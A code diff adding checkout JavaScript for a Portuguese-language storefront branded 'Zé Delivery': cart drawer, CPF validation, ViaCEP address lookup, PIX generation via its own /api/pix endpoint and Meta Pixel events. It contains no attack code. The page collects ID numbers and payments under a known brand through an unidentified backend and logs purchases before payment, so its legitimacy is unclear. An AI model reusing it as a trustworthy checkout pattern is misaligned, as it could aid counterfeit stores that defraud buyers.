+        <div class="cart-item-qty">
+          <button onclick="changeQty(null,'${id}',-1)">−</button>
+          <span>${item.qty}</span>
+          <button onclick="changeQty(null,'${id}',1)">+</button>
+        </div>
+        <div class="cart-item-subtotal">${fmt(item.price * item.qty)}</div>
+      `;
+      container.insertBefore(div, empty);
+    });
+  }
+
+  function openCart() {
+    document.getElementById('cartOverlay').classList.add('open');
+    document.getElementById('cartDrawer').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+  function closeCart() {
+    document.getElementById('cartOverlay').classList.remove('open');
+    document.getElementById('cartDrawer').classList.remove('open');
+    document.body.style.overflow = '';
+  }
+
+  /* ── Checkout ────────────────────────────────────────────── */
+  function goCheckout() {
+    const ids = Object.keys(cart);
+    const total = ids.reduce((s,k) => s + cart[k].price * cart[k].qty, 0);
+    if (total < MIN_ORDER) {
+      document.getElementById('minOrderWarn').style.display = 'block';
+      return;
+    }
+    closeCart();
+
+    // Meta Pixel — InitiateCheckout
+    if (typeof fbq !== 'undefined') {
+      fbq('track', 'InitiateCheckout', {
+        value: total, currency: 'BRL',
+        num_items: ids.reduce((s,k) => s + cart[k].qty, 0)
+      });
+    }
+
+    // Preenche resumo do pedido no modal
+    const itemsEl = document.getElementById('ckOrderItems');
+    itemsEl.innerHTML = ids.map(k =>
+      `<div class="ck-order-row">
+        <span>${cart[k].name} x${cart[k].qty}</span>
+        <span>${fmt(cart[k].price * cart[k].qty)}</span>
+      </div>`
+    ).join('');
+    document.getElementById('ckOrderTotal').innerHTML = `${fmt(total)} <span class="ck-pix-badge">PIX</span>`;
+
+    // Reset telas
+    document.getElementById('checkoutFormArea').classList.remove('hidden');
+    document.getElementById('pixScreen').classList.remove('active');
+    document.getElementById('successScreen').classList.remove('active');
+    document.getElementById('ckTitle').textContent = 'Finalizar Pedido';
+
+    document.getElementById('ckOverlay').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeCheckout() {
+    document.getElementById('ckOverlay').classList.remove('open');
+    document.body.style.overflow = '';
+    clearInterval(pixPolling);
+    clearInterval(pixExpTimer);
+  }
+
+  /* ── Máscaras ────────────────────────────────────────────── */
+  document.getElementById('ckCpf').addEventListener('input', function() {
+    this.value = fmtCpf(this.value);
+  });
+  document.getElementById('ckTel').addEventListener('input', function() {
+    this.value = fmtTel(this.value);
+  });
+  document.getElementById('ckCep').addEventListener('input', function() {
+    this.value = fmtCep(this.value);
+  });
+
+  /* ── CEP autocomplete via ViaCEP ─────────────────────────── */
+  async function onCepInput(input) {
+    const cep = input.value.replace(/\D/g, '');
+    if (cep.length !== 8) return;
+    const spinner = document.getElementById('cepSpinner');
+    spinner.style.display = 'block';
+    try {
+      const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+      const d = await r.json();
+      if (!d.erro) {
+        document.getElementById('ckRua').value    = d.logradouro || '';
+        document.getElementById('ckBairro').value = d.bairro || '';
+        document.getElementById('ckCidadeUF').value = `${d.localidade || ''}, ${d.uf || ''}`;
+        document.getElementById('ckNumero').focus();
+      }
+    } catch {}
+    spinner.style.display = 'none';
+  }
+
+  /* ── Validação ───────────────────────────────────────────── */
+  function validarCpf(cpf) {
+    cpf = cpf.replace(/\D/g, '');
+    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+    let s = 0;
+    for (let i = 0; i < 9; i++) s += parseInt(cpf[i]) * (10 - i);
+    let r = (s * 10) % 11;
+    if (r === 10 || r === 11) r = 0;
+    if (r !== parseInt(cpf[9])) return false;
+    s = 0;
+    for (let i = 0; i < 10; i++) s += parseInt(cpf[i]) * (11 - i);
+    r = (s * 10) % 11;
+    if (r === 10 || r === 11) r = 0;
+    return r === parseInt(cpf[10]);
+  }
+
+  function markError(id, hasError) {
+    const el = document.getElementById(id);
+    if (hasError) el.classList.add('error');
+    else el.classList.remove('error');
+    return !hasError;
+  }
+
+  /* ── Gerar PIX ───────────────────────────────────────────── */
+  async function gerarPix() {
+    const nome  = document.getElementById('ckNome').value.trim();
+    const cpf   = document.getElementById('ckCpf').value.replace(/\D/g,'');
+    const tel   = document.getElementById('ckTel').value.replace(/\D/g,'');
+    const cep   = document.getElementById('ckCep').value.replace(/\D/g,'');
+    const num   = document.getElementById('ckNumero').value.trim();
+
+    let ok = true;
+    ok = markError('ckNome',  nome.length < 3)  && ok;
+    ok = markError('ckCpf',   !validarCpf(cpf))  && ok;
+    ok = markError('ckTel',   tel.length < 10)   && ok;
+    ok = markError('ckCep',   cep.length !== 8)  && ok;
+    ok = markError('ckNumero', num.length < 1)   && ok;
+    if (!ok) { showToast('Preencha todos os campos obrigatórios ⚠️'); return; }
+
+    const ids   = Object.keys(cart);
+    const total = ids.reduce((s,k) => s + cart[k].price * cart[k].qty, 0);
+    const extId = `ZE-${Date.now()}`;
+
+    const btn = document.getElementById('btnGerarPix');
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando PIX...';
+
+    try {
+      const resp = await fetch('/api/pix', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          amount: total,
+          external_id: extId,
+          description: `Pedido Zé Delivery — ${ids.map(k => cart[k].name).join(', ')}`,
+          customer: {
+            name: nome,
+            document: { type: 'CPF', number: cpf }
+          }
+        })
+      });
+
+      const data = await resp.json();
+
+      if (!data.pix_copia_e_cola && !data.qr_code_data) {
+        throw new Error(data.message || 'Erro ao gerar PIX');
+      }
+
+      pixCode  = data.pix_copia_e_cola || data.qr_code_data;
+      pixTxnId = data.transaction?.transaction_id;
+
+      // Preenche tela PIX
+      document.getElementById('pixValorDisplay').textContent = fmt(total);
+      document.getElementById('pixItensDisplay').textContent = ids.map(k => `${cart[k].name} x${cart[k].qty}`).join(' • ');
+      document.getElementById('pixCodigoCola').textContent   = pixCode;
+
+      // QR Code image
+      const qrWrap = document.getElementById('pixQrWrap');
+      if (data.qr_code_image) {
+        qrWrap.innerHTML = `<img src="data:${data.qr_code_image_mime || 'image/png'};base64,${data.qr_code_image}" alt="QR Code PIX">`;
+      }
+
+      // Troca telas
+      document.getElementById('checkoutFormArea').classList.add('hidden');
+      document.getElementById('pixScreen').classList.add('active');
+      document.getElementById('ckTitle').textContent = 'Pague com PIX';
+
+      // Timer 10 min
+      let expLeft = 10 * 60;
+      function updateExpire() {
+        const m = Math.floor(expLeft / 60);
+        const s = expLeft % 60;
+        document.getElementById('pixExpireMin').textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+        expLeft--;
+        if (expLeft < 0) clearInterval(pixExpTimer);
+      }
+      updateExpire();
+      pixExpTimer = setInterval(updateExpire, 1000);
+
+      // Meta Pixel — Purchase (optimistic ao gerar o PIX)
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'Purchase', { value: total, currency: 'BRL' });
+      }
+
+      // Polling status a cada 5s
+      if (pixTxnId) {
+        pixPolling = setInterval(() => checkPixStatus(pixTxnId), 5000);
+      }
+
+    } catch (err) {
+      showToast('Erro ao gerar PIX. Tente novamente. ❌');
+      console.error(err);
+    } finally {
+      btn.disabled = false;
+      btn.innerHTML = '<span class="pix-icon">🔑</span> Gerar PIX e Confirmar Pedido';
+    }
+  }
+
+  /* ── Polling status PIX ──────────────────────────────────── */
+  async function checkPixStatus(txnId) {
+    try {
+      const r = await fetch(`/api/pix?txn=${txnId}`);
+      const d = await r.json();
+      const status = d.transaction?.status || d.status;
+      if (status === 'paid' || status === 'completed') {
+        clearInterval(pixPolling);
+        clearInterval(pixExpTimer);
+        showSuccessScreen(txnId);
+      }
+    } catch {}
+  }
+
+  /* ── Tela de Sucesso ─────────────────────────────────────── */
+  function showSuccessScreen(txnId) {
+    document.getElementById('pixScreen').classList.remove('active');
+    document.getElementById('successScreen').classList.add('active');
+    document.getElementById('ckTitle').textContent = '✅ Pedido Confirmado!';
+    document.getElementById('successOrderId').textContent = txnId || '—';
+    if (typeof fbq !== 'undefined') {
+      fbq('track', 'Purchase', {
+        value: Object.keys(cart).reduce((s,k) => s + cart[k].price * cart[k].qty, 0),
+        currency: 'BRL'
+      });
+    }
+  }
+
+  /* ── Copiar PIX ──────────────────────────────────────────── */
+  function copyPix() {
+    if (!pixCode) return;
+    navigator.clipboard.writeText(pixCode).then(() => {
+      const btn = document.getElementById('btnCopyPix');
+      btn.classList.add('copied');
+      btn.innerHTML = '<i class="fas fa-check"></i> Código copiado!';
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        btn.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+      }, 3000);
+    });
+  }
+
+  /* ── Toast ───────────────────────────────────────────────── */
+  let toastTimer;
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    document.getElementById('toastMsg').textContent = msg;
+    t.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => t.classList.remove('show'), 2200);
+  }
+
+  /* ── Swipe to close drawer ───────────────────────────────── */
+  const drawer = document.getElementById('cartDrawer');
+  let startY = 0;
+  drawer.addEventListener('touchstart', e => { startY = e.touches[0].clientY; }, { passive: true });
+  drawer.addEventListener('touchend', e => {
+    if (e.changedTouches[0].clientY - startY > 80) closeCart();
+  }, { passive: true });
+</script>
+
+</body>
+</html>
